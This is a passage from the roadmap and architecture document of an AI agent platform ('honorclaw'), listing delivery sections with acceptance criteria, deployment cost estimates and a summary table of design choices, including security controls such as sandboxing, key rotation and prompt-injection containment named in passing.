- Slack Channel Adapter: OAuth install, event handling, signing secret verification
- Web UI: React SPA, WebSocket streaming, agent chat, admin panel
- CLI: device auth flow, interactive chat, agent/tool management
- Multi-tenant: RLS, per-workspace encryption keys, storage prefix isolation, index-per-workspace
- Keycloak SAML/OIDC federation (enterprise SSO)
- RBAC: workspace admin, agent admin, agent user, auditor roles
- Tool Registry: storage, search, version management, trust levels
- Tool submission pipeline: automated scan (Trivy, OPA, Semgrep)
- Admin UI: tool catalog, security reports, one-click add-to-agent

**Acceptance criteria:**
- [ ] Slack bot receives messages, responds via agent
- [ ] Web UI: login, chat, view history, manage agents
- [ ] CLI: authenticate, chat, manage agents and tools
- [ ] Tenant A cannot see Tenant B's data
- [ ] SSO login via Okta/Azure AD works
- [ ] Tenant can submit a custom tool and add it to an agent

### Section 3: Memory + Advanced Tools + Multi-Agent

**Scope:** Vector memory (RAG), advanced tools, multi-agent, tool management

**Key deliverables:**
- OpenSearch vector memory: embedding pipeline, semantic search, memory CRUD
- Session archival: Redis → PostgreSQL
- Advanced first-party tools: database_query, code_execution (gVisor), email_send, calendar_read
- Multi-agent: agent-to-agent communication (via Control Plane mediation)
- Sub-agent spawning with inherited but narrowed capability manifests
- Tool management: install, scan, version, remove via Web UI and CLI
- Tool deprecation and forced-update pipeline for CVEs
- GCP and Azure provider implementations (second and third targets)

**Acceptance criteria:**
- [ ] Agent remembers facts across sessions via vector memory
- [ ] database_query executes read-only SQL in sandbox
- [ ] code_execution runs in gVisor sandbox with no network/filesystem
- [ ] Agent A can delegate to Agent B with narrowed capabilities
- [ ] Tool management: install, scan, and remove via Web UI and CLI
- [ ] GCP deployment target functional

### Section 4: Compliance + Hardening

**Scope:** SOC 2 readiness, HIPAA controls, pen testing, documentation

**Key deliverables:**
- Falco rules for all compliance controls
- OPA/Gatekeeper admission policies for cluster security
- Pen testing: prompt injection, tenant isolation bypass, network escape
- Compliance documentation: system security plan, data flow diagrams, control matrix
- Backup and DR: PostgreSQL snapshots, cross-region replication, RTO/RPO documentation
- Incident response runbook
- Container image signing (Cosign/Sigstore)
- Self-hosted deployment guide (k3s + Vault + MinIO + Keycloak)

**Acceptance criteria:**
- [ ] Falco alerting on suspicious syscalls and container behavior
- [ ] OPA policies enforce all security constraints at admission
- [ ] Pen test: no tenant isolation bypass, no network escape
- [ ] Prompt injection test suite: 50+ patterns, all contained
- [ ] Compliance documentation complete for SOC 2 Type I
- [ ] Self-hosted deployment works end-to-end on a single Linux server

### Section 5: Polish + Launch

**Scope:** Production hardening, onboarding, documentation, launch

**Key deliverables:**
- Production environment deployed (AWS first target)
- Onboarding flow: tenant signup → billing → first agent → first conversation
- Documentation: user guides, admin guides, API reference, security whitepaper, tool developer guide
- Monitoring dashboards (Prometheus + Grafana)
- Alerting (PagerDuty/OpsGenie)
- Load testing
- Landing page + docs site
- Tool documentation + example tools

**Acceptance criteria:**
- [ ] Production stable under load test
- [ ] New tenant can sign up and have a working agent in <10 minutes
- [ ] New tool developer can build and submit a tool in <1 hour
- [ ] Documentation covers all features
- [ ] Security whitepaper published

### Section 6: Channels + Automation + Observability

**Scope:** Full channel coverage, event-driven agents, production observability, eval framework

**Key deliverables:**
- Microsoft Teams adapter: Bot Framework v4, channel-to-agent mapping, proactive messaging (escalation delivery), Teams app manifest
- Discord adapter: Discord.js v14, slash commands, DM support, channel-to-agent mapping
- Email adapter: SMTP/IMAP (nodemailer + imapflow), thread continuity via in-reply-to headers, HTML stripping, rate limiting
- Inbound webhook adapter: `POST /webhooks/{agent-id}`, HMAC-SHA256 signature verification, async (202 + run-id) and sync modes, configurable output delivery (HTTP callback, Slack, email, PostgreSQL store)
- Headless session type: `session_type: "interactive" | "scheduled" | "webhook" | "eval"` — no inactivity timeout, full response on completion, audit-logged with trigger source
- Cron scheduler: node-cron in Control Plane, `schedule` field in agent manifest, Redis SETNX distributed lock (prevents duplicate runs on multi-instance), output routed to configured channel adapter
- Notification system: user-preferred channel delivery (Slack, Teams, email, in-app), WebSocket push for in-app badge/drawer, 90-day retention
- `honorclaw eval` framework: YAML test cases, assertion types (contains/not_contains/regex/tool_called/max_turns/pii/response_time_ms), mock tool result injection, JUnit + terminal reporters, budget cap, diff mode (compare two manifest versions)
- OpenTelemetry distributed traces: W3C TraceContext propagation across Redis messages, 8 span types (session, turn, LLM request/response, tool dispatch/execute, policy proxy, manifest enforce), OTLP export, Prometheus metrics endpoint
- Model migration tooling: `honorclaw agents migrate-model` — compatibility report, manifest diff, eval integration, model family knowledge base
- Docker Compose observability profile: Jaeger + OpenTelemetry Collector overlay (`docker compose -f docker-compose.yml -f docker-compose.observability.yml up -d`)

**Acceptance criteria:**
- [ ] Teams bot receives message, routes to agent, sends response; proactive escalation message delivered
- [ ] Discord slash command triggers agent turn; long responses split at 2000-char boundary
- [ ] Email: inbound → agent session → reply in same thread
- [ ] Webhook: POST → 202 + run-id; GET run-id → result; invalid signature → 401
- [ ] Scheduled agent fires at correct time, output delivered to configured channel
- [ ] Distributed lock: second Control Plane instance does not create duplicate scheduled run
- [ ] `honorclaw eval`: passing case exits 0; failing case reports correct assertion + actual output; JUnit XML valid
- [ ] Eval diff mode: regression between manifest v3 and v4 correctly identified
- [ ] OTel trace: session with 2 tool calls produces parent span + 2 child tool spans, visible in Jaeger
- [ ] Trace propagation: span context flows Control Plane → Redis → Agent Runtime → back
- [ ] `honorclaw agents migrate-model`: compatibility report + manifest diff generated; eval regressions reported

---

### Section 7: Advanced Security + Ecosystem

**Scope:** Enterprise-grade security hardening, visual tooling, open ecosystem

**Key deliverables:**
- Redis mTLS: `honorclaw certs generate-redis` creates CA + server cert + per-service client certs; `honorclaw certs rotate-redis` zero-downtime rotation (24h overlap); ioredis TLS config via honorclaw.yaml; plaintext Redis remains Tier 1 default (opt-in mTLS for Tier 2+)
- HSM support: `HsmProvider` interface (`wrapKey`, `unwrapKey`, `sign`, `status`); implementations for AWS CloudHSM, Azure Dedicated HSM (Key Vault Managed HSM), Thales Luna; DEK never persisted plaintext — unwrapped from PostgreSQL at startup via HSM; zeroed from memory on shutdown; FIPS 140-2 Level 3 support
- Audit record signing: `HsmProvider.sign()` on all audit records when HSM enabled; `honorclaw audit verify --record-id <id>` for verification
- Visual manifest editor: React form over Zod schema (6 tabs: Identity, LLM, Tools, Egress, Schedule, Advanced); live validation; YAML preview pane (read-only, Monaco/CodeMirror, copy button); version history + diff view; "Restore this version" (creates new version from old content, never modifies history); canary deployment weight slider; RBAC gating (workspace admin+ to edit, member sees read-only)
- Tool management: `honorclaw tools install/inspect/scan/remove/update`; OCI registry distribution; security scan gate on install (same as first-party); Cosign verification (warn if unsigned, block on failed scan, `--force` logs WARN to audit); `--all` bulk update; `honorclaw doctor` warns on available updates; private registry config option; Web UI install/scan/remove on agent edit page
- Master key rotation audit trail: `honorclaw keys rotate` (atomic: generate → re-encrypt all secrets → re-encrypt DEK → rename key file → signed audit record); `honorclaw keys rotate --dry-run`; `honorclaw keys history`; `honorclaw keys verify`; Admin UI key management page (fingerprint, last rotated, rotation history table, re-auth gate on rotation)
- `honorclaw eval` CI integration: `JJJ-Mo3/eval-action@v1` GitHub Action (runs eval, posts PR annotations, action outputs for conditional steps); GitLab CI job snippet; pre-built `ghcr.io/jjj-mo3/eval-runner:latest` Docker image (included in release pipeline)

**Acceptance criteria:**
- [ ] mTLS: connection without client cert rejected; valid cert succeeds; rotation completes without dropped connections
- [ ] HSM (mock): wrapKey/unwrapKey roundtrip correct; DEK zeroed from memory on shutdown (Buffer contents zero)
- [ ] Audit signing: signed record verified; tampered record fails verification
- [ ] `honorclaw doctor`: HSM status reported correctly (healthy/unreachable)
- [ ] Visual editor: valid manifest created and saved via browser form; YAML preview matches saved manifest exactly
- [ ] Canary: session traffic split confirmed in audit log
- [ ] Version history: all versions listed; diff view correct; restore creates new version with old content
- [ ] RBAC: member read-only; admin can edit; cross-workspace blocked
- [ ] `honorclaw tools install`: image pulled, scanned, registered; scan failure → clear message; `--force` → installed + WARN in audit
- [ ] `honorclaw keys rotate`: all secrets re-encrypted; audit record produced; old key no longer decrypts
- [ ] `honorclaw keys verify`: all values confirmed decryptable post-rotation
- [ ] Key rotation audit record displayed correctly in Admin UI
- [ ] GitHub Actions: eval action posts annotations on PR for failing test cases
- [ ] eval-runner image: `honorclaw eval run` works inside container

---

## 16. Cost Estimate (Production, Single Region)

### AWS Deployment

| Service | Monthly Estimate | Notes |
|---------|-----------------|-------|
| EKS (control plane) | $73 | Fixed cluster fee |
| EC2/Fargate (nodes) | $300-800 | Depends on agent concurrency |
| Aurora Serverless v2 | $200-400 | Scales with load |
| ElastiCache Redis | $150-300 | cache.r7g.large |
| OpenSearch Serverless | $350-700 | 2 OCUs minimum |
| S3 (audit + storage) | $50-100 | Data volume dependent |
| NAT Gateway | $100-200 | 2 AZs |
| Vault (self-hosted on EKS) | $0 | Runs on existing cluster |
| Keycloak (self-hosted on EKS) | $0 | Runs on existing cluster |
| **Total** | **$1,223-2,573/mo** | Production, single region |

### Tier 1: Single Container

| Component | Monthly Estimate | Notes |
|-----------|-----------------|-------|
| Single server (VPS / bare metal) | $20-100 | 4 vCPU, 8GB RAM minimum (Docker Compose) |
| Software | $0 | 1 container (postgres + redis + ollama as s6 child processes) |
| **Total** | **$20-100/mo** | Single-tenant, all inclusive |

A $20/mo VPS (Hetzner, OVH, DigitalOcean) runs Tier 1 comfortably for a single-tenant deployment.

### Self-Hosted / On-Prem (Tier 2-3)

| Component | Monthly Estimate | Notes |
|-----------|-----------------|-------|
| Server (bare metal / VM) | $100-300 | 8 vCPU, 32GB RAM, 500GB SSD (multi-tenant) |
| All services (k3s + operators) | $0 | Open-source stack |
| **Total** | **$100-300/mo** | Multi-tenant capable |

Dev/staging on any cloud: ~$400-600/mo with smaller instances and single-AZ.

---

## Summary of Key Architecture Decisions

| Decision | Choice | Reasoning |
|----------|--------|-----------|
| **Core principle** | Cloud-agnostic via provider interfaces | Deployable on AWS, GCP, Azure, or on-prem without code changes |
| **Compute** | Kubernetes (EKS/GKE/AKS/k3s) | Only compute abstraction that runs everywhere; NetworkPolicy for isolation |
| **Language** | TypeScript/Node.js | Streaming, full-stack, type safety, LLM ecosystem |
| **Database** | PostgreSQL 15+ with RLS | Portable, battle-tested, RLS for multi-tenant |
| **Cache** | Redis 7+ with ACLs | Session state, pub/sub, rate limiting |
| **Vector Store** | pgvector (Tier 1) / OpenSearch (Tier 3+) | Built-in for minimal deployment, scales to OpenSearch |
| **Auth** | Built-in (Tier 1) / Keycloak (Tier 3+) | Zero dependencies for Tier 1; Keycloak for multi-tenant SAML/OIDC |
| **Secrets** | Built-in AES-256-GCM (Tier 1) / Vault (Tier 3+) | Zero dependencies for Tier 1; Vault for dynamic secrets at scale |
| **Audit** | PostgreSQL append-only (Tier 1) / Fluent Bit → WORM (Tier 3+) | Zero dependencies for Tier 1; true WORM for compliance |
| **Encryption** | Built-in AES-256-GCM (Tier 1) / Vault Transit (Tier 3+) | Master key simplicity for Tier 1; HSM-backed for enterprise |
| **IaC** | Terraform (capability modules + cloud targets) | Multi-cloud by design, Helm for K8s resources |
| **LLM** | Custom adapter pattern | Security control, audit integration, credential isolation |
| **Tool Sandboxing** | Capability manifests + separate Pod execution | Architectural enforcement, not behavioral |
| **Tool Extensibility** | Container-based plugins with SDK + security review gate | Secure by default, any-language, isolated execution |
| **Deployment** | 1 container (Tier 1) → full K8s (Tier 3+) | `docker run` for anyone; scales to enterprise |
| **Multi-tenant** | Shared infra + RLS + per-workspace encryption keys | Cost-effective, operationally manageable, strong isolation |
| **Prompt Injection** | Capability Sandwich (untrusted agent between trusted layers) | Physical enforcement — model compliance not required |
| **Input Guardrails** | Pre-LLM rule engine (block injection, tool discovery, prompt extraction) | Structural containment + behavioral reduction |
| **Output Filtering** | OutputFilterProvider (PII + credential detection) | Defense in depth — catches leaks that structural controls miss |
